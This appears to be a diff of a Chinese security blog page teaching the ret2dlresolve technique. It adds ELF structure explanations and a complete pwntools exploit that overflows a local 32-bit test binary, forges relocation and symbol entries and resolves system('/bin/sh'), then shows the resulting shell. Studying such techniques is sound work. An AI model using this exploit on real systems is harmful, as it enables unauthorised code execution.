@@ -13,10 +13,10 @@
     <meta property="og:title" content="ret2dlresolve - 诚安">
     <meta property="og:type" content="article">
         
-    <meta property="article:published_time" content='2021-05-14T00:00:00&#43;08:00'>
+    <meta property="article:published_time" content='2023-02-17T00:00:00&#43;08:00'>
         
         
-    <meta property="article:modified_time" content='2021-05-14T00:00:00&#43;08:00'>
+    <meta property="article:modified_time" content='2023-02-17T00:00:00&#43;08:00'>
         
     <meta name="Keywords" content="信息安全、主机安全、网络安全、二进制、数据安全">
     <meta name="description" content="ret2dlresolve">
@@ -144,9 +144,18 @@
   <ul>
     <li><a href="#概要">概要</a></li>
     <li><a href="#漏洞程序">漏洞程序</a></li>
+  </ul>
+
+  <ul>
     <li><a href="#symtab">symtab</a></li>
+  </ul>
+
+  <ul>
     <li><a href="#strtab">strtab</a></li>
     <li><a href="#jmprel">jmprel</a></li>
+    <li><a href="#延迟绑定图示">延迟绑定图示</a></li>
+    <li><a href="#pwn">pwn</a></li>
+    <li><a href="#关键点">关键点</a></li>
     <li><a href="#参考">参考</a></li>
   </ul>
 </nav>
@@ -188,7 +197,7 @@
             <h1 class="post-title">ret2dlresolve</h1>
         </header>
         <date class="post-meta meta-date">
-            2021年5月14日
+            2023年2月17日
         </date>
         
         <div class="post-meta">
@@ -228,7 +237,7 @@ void vuln(void){
 int main(int argc, char** argv){
     vuln();
 }
-</code></pre><p>开启nx保护和pie</p>
+</code></pre><h1 id="开启nx保护和pie">开启nx保护和pie</h1>
 <pre tabindex="0"><code>└─$ checksec --file=./vuln
 [*] &#39;/home/kali/exploits/ret2dlresolve/vuln&#39;
     Arch:     i386-32-little
@@ -236,12 +245,377 @@ int main(int argc, char** argv){
     Stack:    No canary found
     NX:       NX enabled
     PIE:      PIE enabled
+</code></pre><h1 id="dynamic节">dynamic节</h1>
+<pre tabindex="0"><code>└─$ readelf -d ./vuln     
+
+Dynamic section at offset 0x2ef0 contains 26 entries:
+  Tag        Type                         Name/Value
+ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+ 0x0000000c (INIT)                       0x1000
+ 0x0000000d (FINI)                       0x11dc
+ 0x00000019 (INIT_ARRAY)                 0x3ee8
+ 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
+ 0x0000001a (FINI_ARRAY)                 0x3eec
+ 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
+ 0x6ffffef5 (GNU_HASH)                   0x1ec
+ 0x00000005 (STRTAB)                     0x28c
+ 0x00000006 (SYMTAB)                     0x20c
+ 0x0000000a (STRSZ)                      166 (bytes)
+ 0x0000000b (SYMENT)                     16 (bytes)
+ 0x00000015 (DEBUG)                      0x0
+ 0x00000003 (PLTGOT)                     0x3ff4
+ 0x00000002 (PLTRELSZ)                   16 (bytes)
+ 0x00000014 (PLTREL)                     REL
+ 0x00000017 (JMPREL)                     0x3c4
+ 0x00000011 (REL)                        0x384
+ 0x00000012 (RELSZ)                      64 (bytes)
+ 0x00000013 (RELENT)                     8 (bytes)
+ 0x6ffffffb (FLAGS_1)                    Flags: PIE
+ 0x6ffffffe (VERNEED)                    0x344
+ 0x6fffffff (VERNEEDNUM)                 1
+ 0x6ffffff0 (VERSYM)                     0x332
+ 0x6ffffffa (RELCOUNT)                   4
+ 0x00000000 (NULL)                       0x0
+</code></pre><h1 id="dynamic节表项的结构体">dynamic节表项的结构体：</h1>
+<pre tabindex="0"><code>typedef struct {
+    Elf32_Sword d_tag;
+    union {
+        Elf32_Word d_val;
+        Elf32_Addr d_ptr;
+    } d_un;
+} Elf32_Dyn;
 </code></pre><h2 id="symtab">symtab</h2>
-<h2 id="strtab">strtab</h2>
+<h1 id="符号表项结构体">symtab: dynamic linking symbol table address (.dynsym)<br>
+符号表项结构体：</h1>
+<pre tabindex="0"><code>typedef struct {
+    Elf32_Word st_name;
+    Elf32_Word st_value;
+    Elf32_Word st_size;
+    unsigned char st_info;
+    unsigned char st_other; // 0, no use
+    Elf32_Half st_shndx;
+} Elf32_Sym;
+</code></pre><p>readelf -s 读取符号表：</p>
+<pre tabindex="0"><code>└─$ readelf -s ./vuln             
+Symbol table &#39;.dynsym&#39; contains 8 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.34 (2)
+     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (3)
+     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
+     4: 00000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.1.3 (4)
+     5: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+     6: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
+     7: 00002004     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
+
+Symbol table &#39;.symtab&#39; contains 41 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS Scrt1.o
+     2: 000001cc    32 OBJECT  LOCAL  DEFAULT    3 __abi_tag
+     3: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
+     4: 000010a0     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones
+     5: 000010e0     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones
+     6: 00001130     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux
+     7: 00004010     1 OBJECT  LOCAL  DEFAULT   25 completed.0
+     8: 00003eec     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtor[...]
+     9: 00001180     0 FUNC    LOCAL  DEFAULT   14 frame_dummy
+    10: 00003ee8     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_in[...]
+    11: 00000000     0 FILE    LOCAL  DEFAULT  ABS source.c
+    12: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
+    13: 00002118     0 OBJECT  LOCAL  DEFAULT   18 __FRAME_END__
+    14: 00000000     0 FILE    LOCAL  DEFAULT  ABS 
+    15: 00003ef0     0 OBJECT  LOCAL  DEFAULT   21 _DYNAMIC
+    16: 00002008     0 NOTYPE  LOCAL  DEFAULT   17 __GNU_EH_FRAME_HDR
+    17: 00003ff4     0 OBJECT  LOCAL  DEFAULT   23 _GLOBAL_OFFSET_TABLE_
+    18: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
+    19: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0
+    20: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
+    21: 00001090     4 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.bx
+    22: 00004008     0 NOTYPE  WEAK   DEFAULT   24 data_start
+    23: 0000118d    47 FUNC    GLOBAL DEFAULT   14 vuln
+    24: 00004010     0 NOTYPE  GLOBAL DEFAULT   24 _edata
+    25: 000011dc     0 FUNC    GLOBAL HIDDEN    15 _fini
+    26: 00001189     0 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.dx
+    27: 00000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@G[...]
+    28: 00004008     0 NOTYPE  GLOBAL DEFAULT   24 __data_start
+    29: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+    30: 0000400c     0 OBJECT  GLOBAL HIDDEN    24 __dso_handle
+    31: 00002004     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
+    32: 00004014     0 NOTYPE  GLOBAL DEFAULT   25 _end
+    33: 00001060    44 FUNC    GLOBAL DEFAULT   14 _start
+    34: 00002000     4 OBJECT  GLOBAL DEFAULT   16 _fp_hw
+    35: 00004010     0 NOTYPE  GLOBAL DEFAULT   25 __bss_start
+    36: 000011bc    28 FUNC    GLOBAL DEFAULT   14 main
+    37: 000011d8     0 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.ax
+    38: 00004010     0 OBJECT  GLOBAL HIDDEN    24 __TMC_END__
+    39: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
+    40: 00001000     0 FUNC    GLOBAL HIDDEN    11 _init
+</code></pre><h2 id="strtab">strtab</h2>
+<p>strtab: dynamic linking string table address (.dynstr)</p>
 <h2 id="jmprel">jmprel</h2>
+<p>jmprel: .rel.plt address (for function)
+重定位结构体：</p>
+<pre tabindex="0"><code>typedef struct {
+    // target offset (ex. lazy binding 時, .rel.plt 內的 offset 即是 func@got 的 address)
+    Elf32_Addr r_offset;
+    // first 3 bytes for reloc symbol index in symbol table (.dynsym 的 num)
+    // last 1 byte for reloc type
+    Elf32_Word r_info; 
+} Elf32_Rel;
+#define ELF32_R_SYM(r_info) (r_info &gt;&gt; 8)
+#define ELF32_R_TYPE(r_info) (r_info &amp; 0xff)
+</code></pre><p>readelf -r 读取重定位信息：</p>
+<pre tabindex="0"><code>─$ readelf -r ./vuln
+
+Relocation section &#39;.rel.dyn&#39; at offset 0x384 contains 8 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+00003ee8  00000008 R_386_RELATIVE   
+00003eec  00000008 R_386_RELATIVE   
+00003fec  00000008 R_386_RELATIVE   
+0000400c  00000008 R_386_RELATIVE   
+00003fe0  00000306 R_386_GLOB_DAT    00000000   _ITM_deregisterTM[...]
+00003fe4  00000406 R_386_GLOB_DAT    00000000   __cxa_finalize@GLIBC_2.1.3
+00003fe8  00000506 R_386_GLOB_DAT    00000000   __gmon_start__
+00003ff0  00000606 R_386_GLOB_DAT    00000000   _ITM_registerTMCl[...]
+
+Relocation section &#39;.rel.plt&#39; at offset 0x3c4 contains 2 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+00004000  00000107 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.34
+00004004  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
+</code></pre><h2 id="延迟绑定图示">延迟绑定图示</h2>
+<p>
+        <img class="mx-auto" alt=".rel.plt和.dynsym及.dynstr" src="https://wzt.ac.cn/img/ret2dlresolve3.png" />   
+    </p>
+<p>_dl_runtime_resolve(link_map,reloc_index)获取重定位地址写入got中。link_map.l_info可以获取.rel.plt,.dynsym以及.strtab节地址，而reloc_index可以在.rel.plt节中索引定位到Elf32_Rel。</p>
+<ol>
+<li>Elf32_Rel.r_offset存放需要重定位函数的偏移地址，该地址指向got表项。</li>
+<li>ELF32_R_SYM(Elf32_Rel.r_info)获取.dynsym表的表项，从而获取需要重定位的符号Elf32_Sym</li>
+<li>通过Elf32_Sym.st_name从.dynstr表中获取重定位符号名read@GLIBC_2.0</li>
+<li>_dl_runtime_resolve搜索所有已经加载的共享库，定位到真实的地址，把地址更新到.got.plt中，然后，调用read@GLIBC_2.0</li>
+</ol>
+<h2 id="pwn">pwn</h2>
+<pre tabindex="0"><code>from pwn import *
+
+elf = context.binary = ELF(&#39;./vuln&#39;)
+
+bss_addr = elf.bss()
+
+plt_addr = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr
+dynsym_addr = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addr
+dynstr_addr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr
+rel_plt_addr = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addr
+
+offset = 76
+stack_size = 0x900
+stack_base_addr = bss_addr + stack_size
+rop_size = 0x100
+
+# stage 1:
+rop = ROP(elf)
+rop.raw(&#39;a&#39; * offset)
+rop.read(0,stack_base_addr,rop_size)
+#rop.migrate(stack_base_addr)
+
+libc_addr = 0xf7c00000
+rop.raw(libc_addr + 0x16e138)
+rop.raw(stack_base_addr)
+
+p = process(&#39;./vuln&#39;)
+
+log.info(rop.dump())
+p.sendline(rop.chain())
+
+# stage 2 :
+rop = ROP(elf)
+rop.raw(plt_addr)
+
+fake_rel_offset = 24
+rel_size = 8
+sym_size = 16
+
+# reloc_index for position the fake elfn_rel
+reloc_index = stack_base_addr + fake_rel_offset - rel_plt_addr
+rop.raw(reloc_index)
+
+# the return address in call read@plt
+rop.raw(b&#39;b&#39; * 4)
+
+# fake elfn_sym
+align = 16 - (stack_base_addr + fake_rel_offset + rel_size - dynstr_addr) % 16
+fake_sym_addr = stack_base_addr + fake_rel_offset + rel_size + align
+sym_index = (fake_sym_addr - dynsym_addr) / 16
+sym_index = int(sym_index)
+
+st_name = fake_sym_addr + 16 - dynstr_addr
+st_value = 0
+st_size = 0
+st_info = 0x12
+
+
+# fake elfn_rel
+rel_offset = elf.got[&#39;read&#39;]
+rel_info = (sym_index  &lt;&lt; 8) | 0x7
+
+# system&#39;s parameter
+system_str = &#39;system\x00&#39;
+bin_addr = fake_sym_addr + sym_size + len(system_str)
+rop.raw(bin_addr)
+rop.raw(&#39;aaaa&#39;)
+rop.raw(&#39;aaaa&#39;)
+
+# padding fake elfn_rel
+rop.raw(rel_offset)
+rop.raw(rel_info)
+
+# padding fake elfn_sym
+rop.raw(align * &#39;b&#39;)
+rop.raw(st_name)
+rop.raw(st_value)
+rop.raw(st_size)
+rop.raw(st_info)
+
+# padding fake dynstr
+rop.raw(&#39;system\x00&#39;)
+rop.raw(&#39;/bin/sh\x00&#39;)
+rop.raw( (100 - len(rop.chain())) * &#39;c&#39;)
+p.sendline(rop.chain())
+
+p.interactive()
+</code></pre><p>pwn 运行结果：</p>
+<pre tabindex="0"><code>└─$ python myexploit.py
+[*] &#39;/home/kali/exploits/ret2dlresolve/vuln&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] Loaded 5 cached gadgets for &#39;./vuln&#39;
+[+] Starting local process &#39;./vuln&#39;: pid 129408
+[*] Switching to interactive mode
+
+$ w
+ 04:38:58 up  8:46,  6 users,  load average: 0.29, 0.23, 0.19
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+kali     tty7     :0               Fri04   24:24m  3:55   0.32s xfce4-session
+kali     pts/1    192.168.44.1     00:35    2:09m  1.48s  1.48s -zsh
+kali     pts/2    192.168.44.1     03:16    2.00s  2.35s  0.54s python myexploit.py
+kali     pts/3    192.168.44.1     00:35    3:16m  1.71s  1.11s gdb -q -ex init-gef -q -p 88491
+kali     pts/5    192.168.44.1     03:39    4:55   2.00s  2.00s -zsh
+kali     pts/6    192.168.44.1     04:31    4:58   0.16s  0.16s -zsh
+</code></pre><h2 id="关键点">关键点</h2>
+<ol>
+<li>利用read的溢出漏洞获取再次输入的机会和栈空间转移 
+<table>
+<thead>
+<tr>
+<th style="text-align:center">栈偏移</th>
+<th style="text-align:center">栈内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">+76</td>
+<td style="text-align:center">read@plt</td>
+</tr>
+<tr>
+<td style="text-align:center">+80</td>
+<td style="text-align:center">gadget1 == add esp,8; pop ebx; ret</td>
+</tr>
+<tr>
+<td style="text-align:center">+84</td>
+<td style="text-align:center">0</td>
+</tr>
+<tr>
+<td style="text-align:center">+88</td>
+<td style="text-align:center">stack_base_addr = bss段地址 + stack_size</td>
+</tr>
+<tr>
+<td style="text-align:center">+92</td>
+<td style="text-align:center">stack_size</td>
+</tr>
+<tr>
+<td style="text-align:center">+96</td>
+<td style="text-align:center">gadget2 == pop esp ; ret</td>
+</tr>
+<tr>
+<td style="text-align:center">+100</td>
+<td style="text-align:center">stack_base_addr</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ol>
+<p>因为本机编译的vuln中无法获得栈空间转移的gadget，所以，为了演示只能用libc中的gadget。</p>
+<ol start="2">
+<li>bss段的栈布局</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">栈偏移</th>
+<th style="text-align:center">栈内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">+ 00</td>
+<td style="text-align:center">plt[0]</td>
+</tr>
+<tr>
+<td style="text-align:center">+ 04</td>
+<td style="text-align:center">reloc_index</td>
+</tr>
+<tr>
+<td style="text-align:center">+ 08</td>
+<td style="text-align:center">padding</td>
+</tr>
+<tr>
+<td style="text-align:center">+ 12</td>
+<td style="text-align:center">/bin/sh地址</td>
+</tr>
+<tr>
+<td style="text-align:center">+ 16</td>
+<td style="text-align:center">elfn_rel.r_offset</td>
+</tr>
+<tr>
+<td style="text-align:center">+ 20</td>
+<td style="text-align:center">elfn_rel.r_info</td>
+</tr>
+<tr>
+<td style="text-align:center">+ 24</td>
+<td style="text-align:center">elfn_sym.st_name</td>
+</tr>
+<tr>
+<td style="text-align:center">+ 28</td>
+<td style="text-align:center">elfn_sym.st_size</td>
+</tr>
+<tr>
+<td style="text-align:center">+ 32</td>
+<td style="text-align:center">elfn_sym.st_value</td>
+</tr>
+<tr>
+<td style="text-align:center">+ 36</td>
+<td style="text-align:center">elfn_sym.st_info</td>
+</tr>
+<tr>
+<td style="text-align:center">+ 40</td>
+<td style="text-align:center">&ldquo;system\x00&rdquo;</td>
+</tr>
+<tr>
+<td style="text-align:center">+ 47</td>
+<td style="text-align:center">&ldquo;/bin/sh\x00&rdquo;</td>
+</tr>
+</tbody>
+</table>
 <h2 id="参考">参考</h2>
 <ul>
 <li><a href="https://wzt.ac.cn/2019/05/02/Ret2runtime_dlresolve/">Ret2 runtime_dlresolve</a></li>
+<li><a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf">How the ELF Ruined Christmas</a></li>
+<li><a href="https://ypl.coffee/dl-resolve/">Understanding _dl_runtime_resolve()</a></li>
+<li><a href="https://syst3mfailure.io/ret2dl_resolve">Ret2dl_resolve x64: Exploiting Dynamic Linking Procedure In x64 ELF Binaries</a></li>
+<li><a href="https://thinkycx.me/2018-11-16-XDCTF2015-bof-ret2dlresolve-attack-in-i386.html">XDCTF2015 bof - ret2dlresolve attack in i386</a></li>
+<li><a href="https://hugsy.github.io/gef/commands/vmmap/">gef commands</a></li>
 </ul>
 
         </div>
@@ -264,15 +638,15 @@ int main(int argc, char** argv){
     <h2>See Also</h2>
     <ul class="listing">
         
-        <li><a href="/fightsec/post/pwn_05_ret2plt/">ret2plt</a></li>
+        <li><a href="/fightsec/post/pwn_02_rop/">ROP</a></li>
         
-        <li><a href="/fightsec/post/pwn_03_got_overwrite/">利用got覆盖执行shellcode</a></li>
+        <li><a href="/fightsec/post/pwn_04_ret2libc/">ret2libc</a></li>
         
-        <li><a href="/fightsec/post/pwn_01_pwntools/">pwntools基本用法</a></li>
+        <li><a href="/fightsec/post/arm_20_grooming_ios_kernel_heap/">ios内核堆梳理</a></li>
         
-        <li><a href="/fightsec/post/p04_vul_01_overflow/">缓冲区溢出01-溢出漏洞</a></li>
+        <li><a href="/fightsec/post/arm_19_ios_kernel_heap_overflow/">ios kernel和堆溢出</a></li>
         
-        <li><a href="/fightsec/post/p04_vul_02_overflow/">缓冲区溢出02-shellcode</a></li>
+        <li><a href="/fightsec/post/arm_18_heap_overflow_dev/">arm 堆溢出</a></li>
         
     </ul>
 </div>
@@ -409,6 +783,10 @@ int main(int argc, char** argv){
 <ul class="widget-list">
     
     <li>
+        <a href="https://winsun.github.io/fightsec/post/pwn_07_ret2dlresolve/" title="ret2dlresolve">ret2dlresolve</a>
+    </li>
+    
+    <li>
         <a href="https://winsun.github.io/fightsec/post/pwn_19_exp_socket/" title="socket exploitation">socket exploitation</a>
     </li>
     
@@ -437,15 +815,11 @@ int main(int argc, char** argv){
     </li>
     
     <li>
-        <a href="https://winsun.github.io/fightsec/post/pwn_04_ret2libc/" title="ret2libc">ret2libc</a>
+        <a href="https://winsun.github.io/fightsec/post/p04_vul_04_log4j/" title="log4j">log4j</a>
     </li>
     
     <li>
-        <a href="https://winsun.github.io/fightsec/post/ml_09_similarity/" title="相似度方法">相似度方法</a>
-    </li>
-    
-    <li>
-        <a href="https://winsun.github.io/fightsec/post/ml_08_matplotlib/" title="matplotlib用法">matplotlib用法</a>
+        <a href="https://winsun.github.io/fightsec/post/p04_vul_03_serial/" title="java反序列化漏洞">java反序列化漏洞</a>
     </li>
     
 </ul>
@@ -631,8 +1005,6 @@ int main(int argc, char** argv){
     <a href="https://winsun.github.io/fightsec/tags/%E5%A0%A1%E5%9E%92%E6%9C%BA/">堡垒机</a>
     
     <a href="https://winsun.github.io/fightsec/tags/%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/">概率分布</a>
-    
-    <a href="https://winsun.github.io/fightsec/tags/%E6%A6%82%E7%8E%87%E7%BB%9F%E8%AE%A1/">概率统计</a>
     
     <a href="https://winsun.github.io/fightsec/tags/%E6%B7%B7%E6%B7%86%E7%9F%A9%E9%98%B5/">混淆矩阵</a>
     
